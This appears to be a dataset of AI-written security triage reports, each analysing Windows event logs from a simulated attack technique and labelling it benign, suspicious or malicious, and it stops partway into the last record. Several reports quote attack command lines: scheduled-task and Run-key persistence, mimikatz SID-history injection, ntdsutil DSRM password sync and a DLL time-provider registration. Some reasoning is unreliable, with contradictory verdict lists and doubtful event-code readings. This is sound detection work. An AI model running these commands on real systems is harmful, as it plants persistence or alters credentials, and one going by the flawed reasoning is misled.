Thread Execution Hijacking,"## Detailed Analysis

### Indicators from PowerShell Logs

The Windows PowerShell logs show execution of a PowerShell command sequence that includes several potentially suspicious activities:
- The execution of a secondary process named `InjectContext.exe` located in a temporary directory: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\InjectContext.exe""`. Temporary directories are frequently used by malware to execute or store payloads.
- The PowerShell command initiates Notepad (`Start-Process notepad -passthru`) just to stop it after a short delay, likely to cloak or divert attention from another process being run.
- Executing commands using PowerShell without interactive usage displayed may indicate automation or script execution bypassing user intervention, which can be a sign of automation by malicious scripts.

### Indicators from Sysmon Logs

The Sysmon logs contain predefined process monitoring, indicating the launch of familiar system utilities such as `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and others:
- Multiple system utility executions (`wevtutil.exe`, `whoami.exe`) suggest reconnaissance activities. It is curious when multiple such tools are used in quick succession.
- The `InjectContext.exe` is not recorded directly in the Sysmon logs but is mentioned as part of a PowerShell command. This raises concerns if it is an unmonitored activity, possibly designed to evade logging mechanisms.

### Indicators from Security Logs

- Security audit logs show log events with temporarily elevated privileges (`SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc.). These privileges being obtained can be suspicious as they provide extensive control over system operations. These are often associated with actions taken by malware or by an attacker post-compromise to maintain control or execute sensitive operations.

### Summary

The PowerShell log entry for executing `InjectContext.exe` from a transient directory, combined with Sysmon's non-detection of direct parameters for this process, indicates potentially careful evasion techniques used by sophisticated malware or attackers. The temporary elevation of administrative privileges further aligns with potentially unauthorized activities.

### Conclusion

Upon review of the logs:
- **BENIGN** - The observed logs contain routine and well-explained activity that aligns with benign system functions.
- **SUSPICIOUS** - There is potential for malicious activity due to the execution of scripts from temporary file paths and administrative privileges being used unsubtly.
- **MALICIOUS** - There are concrete signs of malicious exploits due to unclear origins and purpose of a temporary executable file alongside unusual privilege escalations that are consistent with known attack vectors.

### Resolution

**Resolution**: MALICIOUS

### Guidance on How to Proceed

1. **Immediate Threat Mitigation**: Quarantine the system identified to prevent potential spread if it is compromised.
2. **In-depth Investigation**: Investigate the origins and purpose of the `InjectContext.exe` using reverse engineering techniques to analyze behavior.
3. **Incident Response**: Coordinate with the incident response team to fully analyze the impact, collect comprehensive data points, and restrict lateral movement on the network.
4. **Enhance Monitoring**: Update IDS/IPS rules and increase logging verbosity, particularly around PowerShell and elevated privilege use.
5. **Forensic Analysis**: Conduct thorough forensic imaging and analysis of disk and memory to determine any persistence mechanisms.
6. **User Awareness and Education**: Communicate findings and risks to knowledgeable personnel to prevent future occurrences.

Prompt action is encouraged to achieve containment and resolution swiftly."
Dirty Vanity process Injection,"Upon reviewing the provided Windows event logs, several entries indicate potentially suspicious and possibly malicious activities:

1. **PowerShell Activities**: 
   - The PowerShell logs consistently show an execution involving `powershell.exe` with a command line that includes executing a temporary file (`redVanity.exe`) located in the `AppData\Local\Temp` directory. The temporary execution of unknown binaries, especially from user temp directories, is often associated with malicious activities or attempts to evade detection.
   - The embedded command to execute `calc.exe` might be used as a test for execution but can also indicate a technique used to obfuscate actual malicious commands (often referred to as a ""living off the land"" tactic where benign processes are used to mask malicious intentions).

2. **Suspicious Process Interactions**:
   - Several Sysmon entries detail executions of `wevtutil.exe` and `svchost.exe` under accounts like `SERVER002\admin_test` and `NT AUTHORITY\SYSTEM`. While these processes are legitimate Windows processes, their use in conjunction with unusual PowerShell activity can be a red flag, especially if launched in a script.
   - The presence of an unknown process ID and user association in one of the Sysmon event logs can indicate an attempt to execute or cloak actions without generating fully traceable process relationships.

3. **Security Log Entries**:
   - Privileged accounts (`admin_test`) were involved and granted numerous high-level privileges according to logs, including `SeDebugPrivilege`, `SeImpersonatePrivilege`, among others. The timing coincides with other entries in both PowerShell and Sysmon logs, suggesting potential misuse of privileges for administrative actions.
   - Repeated logon attempts with administrative privileges using NTLM authenticated from an external IP, could indicate a lateral movement attempt or unauthorized remote access.

Given these observations, I conclude that the logs display evidence of potentially **MALICIOUS** activity. The execution of binaries from temporary directories via PowerShell, along with the use of administrative privileges, aligns with tactics commonly employed by threat actors to carry out unauthorized actions.

**Recommended Next Steps**:
1. Isolate the affected machine (Server002) from the network to prevent further propagation.
2. Perform a full forensic analysis on `redVanity.exe` and any processes linked to it.
3. Review user account permissions and credentials associated with `admin_test` for signs of compromise.
4. Implement stricter monitoring of PowerShell scripts and execution policies across the network.
5. Conduct threat hunting activities to see if similar indicators of compromise are present on other hosts in the network."
Process injection ListPlanting,"### Detailed Analysis:

Upon reviewing the provided Windows event logs, several entries stand out that suggest potentially suspicious activity:

1. **PowerShell Activity**:
   - The Sysmon logs show multiple instances of PowerShell execution (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`). These entries typically include common administrative tasks but can also be leveraged for malicious purposes, such as file execution and process termination, as seen with executable operations (`ListPlanting.exe`).
   - The command line arguments in the PowerShell execution included `Start-Process` with a path to a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.015\bin\ListPlanting.exe`) and contains actions that stop processes silently, which raises suspicion.

2. **High Integrity Level Executions**:
   - Multiple processes have been executed under High integrity levels (including `conhost.exe` and `PowerShell.exe`), all running as `SERVER002\admin_test`. Executing suspicious scripts with elevated privileges could indicate exploitation attempts or lateral movement.

3. **Privileged Logins**:
   - The security log entries reveal that the user `admin_test` logged in using NTLM authentication. Afterward, the user was granted a number of high-level privileges (`SeSecurityPrivilege, SeDebugPrivilege, etc.`). While not directly malicious, such privileges can provide the ability to alter sensitive security settings or impersonate other sessions.
   - Notably, these logins occurred from a non-local source (different IP addresses), which raises further concerns if `DESKTOP-3HL5B2P` is not a recognized workstation tied to administrative tasks.

4. **Execution of Unfamiliar Executable**:
   - The `ListPlanting.exe` executable within the Temp directory is unusual. While the logs do not confirm its contents, its temporary location, coupled with the fact it is executed via PowerShell and stops other processes, fits patterns seen in malware that attempts to disguise operations.

5. **Edge Update Executions**:
   - The Sysmon logs demonstrate multiple executions of Microsoft Edge installers and related components in rapid succession under the `NT AUTHORITY\SYSTEM` user. These are normal for updates but the extensive activity immediately following the PowerShell scripts implies a potential smokescreen for malicious actions.

### Assessment:

Based on the log review, there are several aspects that are concerning:
- Execution of temporary binaries using PowerShell.
- Usage of elevated privileges, especially on potentially unauthorized access sessions.
- The presence of a suspicious executable (`ListPlanting.exe`) executed in patterns related to process manipulation.

### Resolution:
- **SUSPICIOUS**: The logs contain actions and sequences that are unusual and align with known tactics in various cyber attack scenarios. While there's no conclusive evidence of outright malicious activity given this data set, the elements involved—such as PowerShell usage with command execution and restart processes—require immediate further investigation to clarify the intentions and authenticity of running these tasks. It is crucial to verify the legitimacy of the processes and their source, as well as confirm access rights to the underlying administrative accounts.

### Guidance:
- **Conduct a thorough scan for malware**: Specifically in the Temp directory and any user directories mentioned.
- **Audit accounts and privileges**: Ensure `admin_test` use is consistently legitimate and contains no unauthorized privilege escalations or lateral movements.
- **Verify external machine**: Assess the identity and role of `DESKTOP-3HL5B2P` in your network to confirm if logon attempts are justified.
- **Review Security Policies**: Look for any discrepancies or weaknesses in the application of security configurations and access controls.

Immediate attention to these concerns can help mitigate any potential threats, while ensuring the system’s integrity is maintained."
Parent PID Spoofing - Spawn from Specified Process,"Upon reviewing the logs provided, I have identified several points of interest that could potentially indicate suspicious or malicious activity:

### Analysis:

1. **Windows Update Logs (System Log):**
   - The Windows Update logs show normal update activities for various Microsoft packages such as WindowsCamera, VCLibs, YourPhone, etc. These entries, in isolation, do not indicate malicious behavior.

2. **PowerShell Activity (Windows PowerShell Log):**
   - Various PowerShell sessions started with a command: `powershell.exe & {Start-ATHProcessUnderSpecificParent -ParentId $PID -TestGuid 12345678-1234-1234-1234-123456789123}`.
   - Another command executed with restricted policy which checks installation files: `powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ...`.
   - While these commands could be part of legitimate administrative tasks, the `Start-ATHProcessUnderSpecificParent` command looks custom and could be used to execute processes under specific parent processes, potentially a method for persistence or evading detection.

3. **Security Logs:**
   - Several 5379 events are logged, indicating Credential Manager credential enumeration attempts. This isn't typically a common occurrence for normal behavior.
   - Event ID 4624 indicates a successful logon with elevated privileges (SYSTEM), which might be legitimate on a server environment but should be correlated with other logs.

4. **Sysmon Activity:**
   - Multiple instances of PowerShell and conhost.exe are spawned. Some of these might be related to the PowerShell script execution observed previously.
   - Processing running under `NT AUTHORITY\SYSTEM` which suggests that these processes were executed with elevated permissions.

5. **Installations and Updates:**
   - Normal software update activities are logged, specifically for Microsoft Edge, which aligns with legitimate software maintenance.

### Threat Assessment:

- The presence of custom PowerShell scripts and the use of Start-ATHProcessUnderSpecificParent raises a flag for potentially anomalous behavior, as this is not common in standard environments without specific tasks in mind.
- The security log indicating multiple Credential Manager attempts is suspicious, particularly in conjunction with custom PowerShell commands.
- The repeated invocations of system utilities via PowerShell could be part of a scripted routine or an indicator of an initial compromise phase involving reconnaissance or credential access.

### Resolution:

Overall, while some behavior such as software updates are benign and typical in a controlled environment, the presence of custom PowerShell commands combined with credential enumeration attempts necessitates further investigation.

- **Resolution: SUSPICIOUS**

### Guidance:

- Investigate the source and intent of the PowerShell script `Start-ATHProcessUnderSpecificParent`.
- Confirm the legitimacy of the credential enumeration attempts in the context of the server's role and users.
- Assess any anomalies related to the processes running under elevated SYSTEM privileges.
- Review the execution context and history of the processes to ensure they align with expected usage patterns on this server.
- Consider integrating advanced endpoint detection solutions or conduct a manual audit for potential indicators of compromise associated with these logs."
Driver Installation Using pnputil.exe,"Based on the review of the provided logs, here's a detailed analysis of the activities captured within them:

1. **Sysmon Logs**: 
   - **Process Execution**: There are multiple instances of standard Windows binaries running, including `hostname.exe`, `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `powershell.exe`. The execution of these binaries is often legitimate and not suspicious on its own.
   - **Command-Line Usage**: The use of command-line arguments such as `pnputil.exe -i -a C:\\Windows\\INF\\acpipmi.inf` executed via PowerShell could be potentially suspicious. This indicates that a driver is being installed, which, if unexpected, could be a vector for unwanted activity. However, without additional context (e.g., authorized admin action), it's difficult to assert malicious intent conclusively.
   - **Network and System Activity**: The usage of `wevtutil.exe` to interact with event logs might indicate log-clearing efforts, potentially signaling malicious activity trying to cover tracks. However, this by itself is not enough to declare malicious intent without a specific suspicious context.

2. **Security Logs**: 
   - **Privileged Use**: The logs indicate a user `admin_test` has privileges like `SeDebugPrivilege`, `SeSystemEnvironmentPrivilege`, and `SeLoadDriverPrivilege`. The use of such privileges should be under monitoring as they allow sensitive operations that an attacker might exploit.
   - **Logon Events**: The logs show successful logon events for the `admin_test` user. The use of NTLM authentication and the logged privileges are noteworthy, yet alone do not indicate malicious activity.

3. **Powershell Logs**:
   - **PowerShell Execution Details**: There’s a record of script execution to execute `pnputil.exe`. If this PowerShell script was unexpected or if it originated from a suspicious source, it would likely require further investigation.

4. **Application Logs**:
   - **Minor Service Events**: Application logs note Edge Update services starting and stopping, which is typical for scheduled system updates.

**Overall Assessment and Conclusion**:
Given these observations, the PowerShell execution involving `pnputil.exe` and the use of `wevtutil.exe` could be deemed suspicious particularly in the context of its potential to be exploited for persistence or data tampering by a malicious actor. However, without a clear indication of unauthorized access or additional malicious indicators, such actions can be part of legitimate administrative operation.

**Recommendation**:
- Conduct a more in-depth investigation into the PowerShell script and its origin. Identify if the script matches authorized administrative actions.
- Verify the legitimacy of the users and sessions executing these commands.
- Ensure that system and audit logs are reviewed regularly, focusing on unusual or repeated access to sensitive logs and execution of high-integrity privileged operations.
  
**Resolution**: **SUSPICIOUS** - The logs contain activities that do not look entirely benign and warrant further detailed investigation to rule out any malicious activity."
Launch NSudo Executable,"Upon analyzing the collection of events from various logs, here is a detailed assessment regarding potentially malicious activities:

1. **Security Log Analysis:**
   - Event ID 5379 indicates failure to retrieve domain credentials multiple times with the ReturnCode `3221226021`, translating to `STATUS_PASSWORD_MUST_CHANGE`. Usually, this event triggers in a legitimate context when an account's password expires or gets reset, necessitating a password change. However, there is a repeated occurrence of the event for a service account (`SERVER002$`) and a Microsoft account (`MicrosoftAccount:user=02txoixylodcstop`). This repeated failure in context warrants closer scrutiny as it might denote attempts to exploit an account.
   - Event ID 4798 involves enumerating local group memberships concerning various accounts, including `Administrator`. While possibly legitimate, enumeration of group memberships may indicate preparatory steps for privilege escalation by attackers.

2. **PowerShell Log Analysis:**
   - The command known as `NSudoLG.exe`, executed with the arguments to run `cmd` as TrustedInstaller with elevated privileges (admin rights), suggests an attempt of privilege escalation or to bypass UAC (User Account Control).
   - The PowerShell session captures show a script that runs `Start-Process ""NSudoLG.exe""` to execute a `cmd` with elevated privileges, followed by a forced termination of the `cmd` process. This pattern is commonly seen in malicious activities.
   
3. **Sysmon Log Analysis:**
   - A sequence of events involves various Windows binaries, including `svchost.exe`, `powershell.exe`, and `wevtutil.exe`, being launched by the `SERVER002\\admin_test` user. The combination of these processes can be a legitimate administrative operation, but it could also indicate suspicious activity—possibly reconnaissance or cleaning activities post-exploitation.
   - The use of `powershell.exe` and `conhost.exe` in conjunction with elevated processes underscores potential evasion or abuse attempts.
   - Processes such as `CompatTelRunner.exe` and `DeviceCensus.exe` appear to be standard Windows telemetry activities, logged under Sysmon which may be non-threatening under normal circumstances.

4. **Application Log:**
   - Nothing stands out in the application log. Windows Defender is operational, with no unusual activity or alert indicated.

Based on this analysis, while there is no definite indication of a fully executed attack or breach, several events (especially involving PowerShell and failed credential access) reflect suspicious behavior suggesting potential adversary presence requiring more detailed investigation.

**Resolution: SUSPICIOUS**

Next Steps:
- Conduct a deeper forensic analysis on the endpoints associated and verify the legitimacy of PowerShell scripts executed.
- Capture network logs or engage with a network security team to assess outgoing traffic for the host possibly indicating data exfiltration or C2 communication.
- Review access logs to confirm legitimate use of accounts or any contradictory evidence suggesting compromise.
- Engage with the user `admin_test` if applicable, to confirm whether the activity, such as PowerShell usage, was routine or unexpected."
Scheduled Task Startup Script,"Upon reviewing the provided event logs, the following observations and analysis are made:

### Observations:
1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`:**
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test` in quick succession. `wevtutil.exe` is a legitimate Windows utility for managing event logs, while `conhost.exe` is associated with command prompt operations.

2. **Execution of Hostname and Whoami:**
   - `HOSTNAME.EXE` and `whoami.exe` are executed to retrieve system information like current hostname and current user's details. While these are benign utilities, their repetitive execution might warrant closer attention, especially when combined with other suspicious activities.

3. **Creation of Scheduled Tasks via `cmd.exe`:**
   - A `cmd.exe` process is creating scheduled tasks `data_005_OnLogon` and `data_005_OnStartup` using the following command: 
     - `/c schtasks /create /tn ""data_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe""`
     - It is scheduled to trigger `calc.exe` (calculator) on logon and startup under system privileges. While launching `calc.exe` is common, using scheduled tasks in this manner can be a common technique for persistence or testing by an attacker.

4. **Sysinternals Event:**
   - The logs show execution records from Sysmon, a part of the Sysinternals suite, which is often used for monitoring and advanced logging. The processes running seem normal, with a focus on legitimate Windows processes.

5. **Execution of Edge Update:**
   - `MicrosoftEdgeUpdate.exe` process shows up as a standalone service running under `NT AUTHORITY\SYSTEM`, which is a routine operation for maintaining the Edge browser.

### Assessment:
- The creation of scheduled tasks to execute `calc.exe` using `cmd.exe` with high integrity level is a red flag, suggesting potential testing or malicious persistence.
- The legitimate utilities (`whoami.exe`, `hostname.exe`, etc.) executed alone would generally not raise alarms, but combined with the scheduled task creation, they may indicate an attempt to stealthily perform reconnaissance or maintain access.
- The overall behavior leans towards suspicious activities due to the scheduled execution practices which are non-standard for regular system or software application operations.

### Resolution:
- **Resolution:** **SUSPICIOUS**
- **Rationale:** While many processes appear legitimate on the surface, the creation of scheduled tasks to execute commands on system startup or logon — especially commands that don't seem to serve a legitimate purpose (like launching the calculator without user intention) — raises concern. Further investigation is needed to check if this activity aligns with expected administrative routines or is an anomaly.

### Guidance:
1. **Investigate the Origin of Scheduled Tasks:**
   - Identify if such scheduled tasks have legit administrative purposes or are potentially set by scripts/tools used by system admins.

2. **Validate User Activity:**
   - Verify whether `SERVER002\admin_test` is performing actions aligned with their role, or if accounts with such names might have been compromised.

3. **Monitor and Contain:**
   - Continue monitoring for additional scheduled task creations and other suspicious activities.
   - Remove or disable suspicious scheduled tasks if no formal justification exists, and ensure appropriate security measures are in place.

4. **Conduct Threat Hunting:**
   - Look for other potential indicators of compromise across the network that may relate to this behavior and set alerts for similar future events."
Password Change on Directory Service Restore Mode (DSRM) Account,"### Analysis of Windows Event Logs

#### Observations

1. **Process Executions:**
   - **PowerShell Logs:**
     - The PowerShell logs were not provided; therefore, no suspicious activity can be evaluated from this source.
   
   - **Sysmon Logs:**
     - Multiple instances of `wevtutil.exe`, `conhost.exe`, and `hostname.exe` are executed by the user `SERVER002\admin_test`. `wevtutil.exe` is a utility that manages event logs, which is a common benign activity but can be used for malicious purposes such as clearing logs.
     - Instances of `cmd.exe` executed with a command-line argument suggesting a potential attempt to modify the DSRM password using `ntdsutil` tool. The argument `/c ntdsutil ""set dsrm password"" ""sync from domain account %%username%%"" ""q"" ""q""` is suspicious. This is typically used in domain controller environments, and execution without proper oversight implies a potential security risk.
     - The processes `whoami.exe` and the repeated use of `conhost.exe` on the machine might indicate reconnaissance activities.

2. **Privilege Escalation:**
   - **Security Logs:**
     - Security events such as `4672` logged for `admin_test` indicate special privileges assigned to this user session. The privileges include `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeDebugPrivilege`, `SeSystemEnvironmentPrivilege`, `SeLoadDriverPrivilege`, and others which are consistent with an administrative account.
     - These privileges are typically benign but could be dangerous if accounted for with unauthorized access.

3. **Time Changes (Potential Time Stomping):**
   - **System Logs:**
     - Time-related events indicate a slight time rollback, which might hint at time-stomping attempts potentially aligning log timestamps to hide malicious activity.

4. **Network Activity:**
   - Connections from `DESKTOP-3HL5B2P` through IP address `fe80::e3b5:5371:12a8:9c77` over NTLM, documented under Security Event 4624. This could be normal if `DESKTOP-3HL5B2P` is a known workplace computer, but may need verification for legitimacy.

5. **Normal System and Network Processes:**
   - Processes like `svchost.exe`, `sppsvc.exe`, and `TiWorker.exe` running under `NT AUTHORITY\SYSTEM` and `NETWORK SERVICE` accounts do not exhibit immediately suspicious behavior.

#### Assessment and Resolution

Based on the above analysis, there are multiple indicators that suggest suspicious activity due to the use of administrative utilities (e.g., `ntdsutil`) with high privileges and potential time-stomping attempts. These actions, coupled with regular system processes, make it challenging to definitively categorize as malicious without further context and verification of actions performed by `SERVER002\admin_test`.

**Resolution: SUSPICIOUS**

#### Guidance on How to Proceed

- **Verification of User Activity:** Investigate the authorization and intent behind the `admin_test` user's actions, especially concerning the `ntdsutil` usage.
- **Log Integrity Check:** Ensure that no unauthorized alteration (time-stomping) of logs occurred.
- **Confirm Network Connections:** Verify if connections from `DESKTOP-3HL5B2P` are legitimate.
- **Continuous Monitoring:** Implement increased monitoring and logging for the user `admin_test` and similar processes.
- **User Education and Policy Enforcement:** Ensure users understand the implications of high-level administrative tool usage and maintain strict enforcement of user access policies."
Injection SID-History with mimikatz,"Upon review of the provided Windows event logs, the analysis reveals multiple indicators of potentially malicious activity:

### Suspicious/Anomalous Behavior:
1. **Execution of Mimikatz**: 
   - A significant indicator of malicious activity is evident with the attempted execution of `mimikatz.exe`, a well-known tool used for credential extraction.
   - Sysmon Event ID 1 records the execution of `cmd.exe` with command-line arguments pointing to the mimikatz executable located at `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\mimikatz\\x64\\mimikatz.exe`. This indicates an attempt to run this tool.
   - The command `privilege::debug` is suggestive of an attempt to gain debug privileges, which is often misused for unauthorized activities.
   - The use of the command `sid::add` further reinforces the likelihood of privilege escalation attempts.

2. **Abusive Command Line Execution**:
   - Multiple usages of `cmd.exe` and `powershell.exe` with suspicious command lines are evident, specifically engineered to check the existence of mimikatz.

3. **Presence of `wevtutil.exe`**:
   - The process `wevtutil.exe` is executed multiple times. While typically used for managing Windows Event Logs, its unusual repeated execution might indicate attempts to clear logs to cover tracks.

4. **High Integrity Level**:
   - The processes are executed with a high integrity level, which typically suggests elevated privileges, often seen in malicious activities for carrying out unauthorized actions successfully.

5. **Lack of Justifiable Context**:
   - The absence of a clear, legitimate administrative context for the execution of these tools and commands underscores the potential for nefarious intent.

### Potential Indicators of Compromise (IoC):
- `mimikatz.exe` execution attempt.
- Process execution sequences involving `cmd.exe`, `Powershell.exe`, and `wevtutil.exe` in rapid succession.

### Assessment and Conclusion:
Based on the logs, especially the Sysmon log entries, there is clear evidence of malicious intent. The execution of `mimikatz.exe`, an attacker-favored tool for credential harvesting, combined with the command-line activities, signifies a considerable risk of compromise.

### Resolution:
**MALICIOUS**

### Guidance:
1. **Immediate Isolation**: Isolate the impacted host to prevent further spread or damage.
2. **Comprehensive Scanning**: Conduct thorough malware scanning and integrity checking across the system.
3. **Incident Response Activation**: Initiate a full incident response investigation to assess the scope of the compromise.
4. **Credential Changes**: Advise prompt changes to all credentials potentially exposed or stored on the host.
5. **Log Review and Monitoring**: Intensify log monitoring for similar IoCs across other systems within the network.

Continue with an in-depth forensic analysis to understand the full extent and impact of the intrusion, and consider additional hardening measures to protect against similar threats in the future."
Create a new time provider,"Upon reviewing the provided Windows event logs, several indicators suggest potential malicious activity:

1. **Abnormal PowerShell Activity**: The Windows PowerShell log contains commands that suggest potentially malicious behavior:
   - A PowerShell script is executed that performs the following operations:
     - Stops the Windows Time service (`net stop w32time`).
     - Copies a DLL file (`fileTest.dll`) from a temporary path to a public directory.
     - Modifies the Windows registry to configure a new time provider (`fileTest`) with the `DllName` pointing to the copied DLL. It enables and registers this new time provider to the system.
     - Restarts the Windows Time service (`net start w32time`).
   - These actions can be indicative of a persistence mechanism, where malicious actors use DLLs as time providers to execute code at machine startup or periodically.

2. **Kernel and Time Service Errors**: System log shows entries for the Windows Kernel-General and Time-Service logs:
   - The Time Service failed to start a time provider module with the message ""The specified module could not be found."" This corresponds with the attempts to load the newly copied DLL and is consistent with malware attempting to manipulate system services.

3. **Sysmon Logs**:
   - These logs show the execution of processes (`net.exe`, `reg.exe`, `whoami.exe`, `conhost.exe`, and `powershell.exe`) that are commonly used for lateral movement, privilege escalation, and reconnaissance activities. The creation and execution of these processes appear in a pattern that matches the PowerShell script's behavior.

4. **Edge Update Service Activity**: Although frequent activity related to Microsoft Edge updates is visible, it appears consistent with routine software updates and is likely benign.

### Assessment:
Based on the above observations, the combination of registry modifications, DLL manipulation, and service restarts conducted via PowerShell signals a strong likelihood of malicious activity. The logs show a script-driven operation that is typical of a malware operation attempting to gain persistence and possibly conduct further activities under higher privileges.

### Resolution: MALICIOUS

### Recommendations:
- **Immediate Isolation**: The affected host (Server002) should be isolated from the network to prevent potential lateral movement or data exfiltration.
  
- **Forensic Investigation**: Conduct a comprehensive forensic investigation to identify how the malicious script and DLL were introduced to the system and trace any additional compromise.

- **Containment and Remediation**:
  - Remove any unauthorized time providers and associated DLLs.
  - Review and revoke any unauthorized modifications in the registry relating to service configurations.
  - Update virus and malware definitions on security solutions and conduct a full scan.

- **Monitoring and Alerting**: Implement additional monitoring to detect similar behavior on other systems. Alert on suspicious PowerShell executions, registry modifications, and service disruptions.

- **Patch and Update**: Ensure all software, including security software, is up-to-date to protect the system from known exploits and vulnerabilities."
Process Injection with Go using UuidFromStringA WinAPI,"Based on the logs provided, I identified the following points of interest:

1. **PowerShell Activity**:
   - A PowerShell session is executed with a command pointing to what appears to be a custom executable (`UuidFromStringA.exe`) located in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\`). The use of temporary paths and the execution of non-standard binaries often indicate potentially obfuscating or malicious behavior.
   - The command-line used is `powershell.exe & {C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\UuidFromStringA.exe -debug}`, which does not appear to be a typical administrative or benign task.

2. **Time Manipulation Events**:
   - There are events indicating that the system time was altered. This can sometimes be associated with attempts to manipulate log data or bypass certain time-based security checks.

3. **Sysmon Logging**:
   - There is frequent launching of processes like `wevtutil.exe`, `whoami.exe`, and `conhost.exe`. While these commands can be used for legitimate administrative purposes, they can also be leveraged by attackers for reconnaissance or cleanup (e.g., clearing event logs with `wevtutil.exe`).

4. **Presence of Administrative User**:
   - There are events executed under the administrative user `admin_test`, which could imply that elevated processes could have been run with this account.

5. **Network Service and SPP logging**:
   - The presence of `svchost.exe` with NETWORK SERVICE privileges and actions by `sppsvc.exe` might not be immediately suspicious, but any unusual spikes in activity involving these services should be monitored for potentially unauthorized actions.

### Assessment and Resolution:
- The presence of a non-standard executable executed via PowerShell, coupled with time manipulation and administrative account activity, definitely raises red flags.
- Given these findings, this activity is **SUSPICIOUS**. Further investigation is recommended to determine if this activity was authorized, understand the purpose of the `UuidFromStringA.exe` execution, and ensure no malicious actions were carried out.

### Guidance on How to Proceed:
- **Sandbox Analysis**: Conduct a controlled execution of `UuidFromStringA.exe` in a sandbox environment to observe its behavior.
- **Account Verification**: Verify the activities performed by `admin_test` user and ensure the account has not been compromised.
- **Time Sync**: Investigate why the time changes were made and check if these were part of authorized administrative tasks. Ensure current time is synchronized with a reliable source.
- **Incident Response**: Consider initiating an incident response to assess whether this behavior persists and potentially isolate affected systems if further malicious intent is uncovered."
"Scheduled Task (""Ghost Task"") via Registry Key Manipulation","Based on the analysis of the provided logs, let's examine the notable entries to identify any malicious or suspicious activity:

1. **Application Log Entries**:
   - Both entries show Windows Defender in a ""SECURITY_PRODUCT_STATE_ON"" state, indicating that the antivirus protection was active and functioning. This is a positive security indicator and does not appear suspicious or malicious.

2. **Sysmon Log Entries**:
   - **Unusual Usage of PsExec and GhostTask**: The command-line execution of `cmd.exe` with PsExec observed in event with process ID 6048 (`CommandLine` entry showing execution of `PsExec.exe` and `GhostTask.exe`) is potentially suspicious, particularly due to the execution of PsExec, which is a legitimate tool often used for remote execution and lateral movement by attackers. The command involves setting up a ""GhostTask,"" which could imply unauthorized actions or persistence mechanisms.

   - **PowerShell and conhost.exe Activities**: The execution of `powershell.exe` and multiple instances of `conhost.exe` is not inherently suspicious, as these are commonly used system components. However, these need to be checked against usual activity to ensure they weren't used for unusual purposes.

3. **Microsoft Edge Update Activity**:
   - The entries related to Microsoft Edge updater processes show regular updates with standard parameters such as `--msedge`, `--verbose-logging`, etc., without any immediate red flags. These processes, including various installers and temp setup files, appear routine for a system update.

4. **Use of Elevated Privileges**:
   - The logs demonstrate processes running under the `NT AUTHORITY\SYSTEM` context. This is common for system updates and administrative tasks but should be confirmed as legitimate when mixed with tools like PsExec.
   
5. **Overall Observations**:
   - The use of PsExec and GhostTask is primarily what raises concerns. PsExec is a tool frequently used by both administrators and attackers to execute processes remotely, which can make it a tool for lateral movement or privilege escalation attempts. The context and command-line arguments suggest this requires further scrutiny.

### Resolution: SUSPICIOUS

There are indicators of potentially suspicious activity in these logs, mainly due to the use of PsExec in conjunction with a process named GhostTask. Here are some suggestions for proceeding:

- **Further Investigation**: Additional investigation is needed to understand the context of the PsExec and GhostTask execution. Verify if this was an authorized administrative action or part of a script that may have been used for regular maintenance.
  
- **Review of User Actions**: Investigate the purpose and origin of the actions executed by `SERVER002\admin_test`, who executed these actions. Ensure these actions align with known and approved administrative activities.

- **Monitor for Anomalies**: Continue monitoring for any further unusual use of administrative tools or abnormal network activity indicating lateral movements.

Taking these steps will help clarify the nature of these activities and confirm whether they pose any actual threat."
HKCU - Policy Settings Explorer Run Key,"Based on the detailed analysis of the provided Windows event logs, I've identified potential indicators of suspicious and potentially malicious activity. Here are the key observations and findings:

1. **Time Synchronization Events**:
   - The System log indicates a series of time synchronization events via `svchost.exe` to `time.windows.com`. While time synchronization is a normal activity, repeated or unusual time changes could be concerning if it attempts to cover tracks after manipulation.

2. **Process Creation Events**:
   - The Sysmon log shows several benign process creations like `whoami.exe`, `conhost.exe`, and `hostname.exe`. However, the creation and usage of `powershell.exe` with specific command-line arguments stand out.

3. **PowerShell Activity**:
   - There is a notable PowerShell command execution in the logs: `powershell.exe & {if (!(Test-Path -Path \""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"")){, New-Item -ItemType Key -Path \""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"", }, Set-ItemProperty -Path \""HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"" -Name \""filetest\"" -Value \""C:\\Windows\\System32\\calc.exe\""}`.
   - This command is potentially malicious because it adds a registry key to run `calc.exe` upon login. Modifying the registry to create or alter startup entries is a common persistence technique used by malware.

4. **Security and PowerShell Logs**:
   - The Security logs do not show any direct anomalies or failed login attempts, which often appear in breach scenarios.
   - The PowerShell logs confirm the execution of a potentially malicious PowerShell script, which could be part of an attack to maintain persistence.

**Assessment**: The primary concerning activity is the PowerShell script execution which modifies startup entries in the registry. This behavior is consistent with techniques used by attackers to establish persistence on compromised systems.

**Resolution**: Based on the analysis, the activity observed is categorized as **MALICIOUS**.

**Guidance on How to Proceed**:
- Immediately isolate the host (Server002) from the network to prevent potential lateral movement or further compromise.
- Analyze the extent of the breach, especially if there are similar entries in other systems' logs.
- Conduct forensic analysis of the machine to identify the vector of attack and any additional malicious artifacts or changes.
- Remove the malicious registry key and any associated malware or unauthorized scripts/tools.
- Perform a full antivirus and antimalware scan.
- Review user access and privileges, and change account passwords, especially for the compromised `admin_test` account.
- Consider redeploying the host to ensure complete removal of any persistent malware.
- Implement monitoring for unusual PowerShell activity and registry changes going forward."
Admin Account Manipulate,"After carefully analyzing the provided Windows event logs, the following findings are observed:

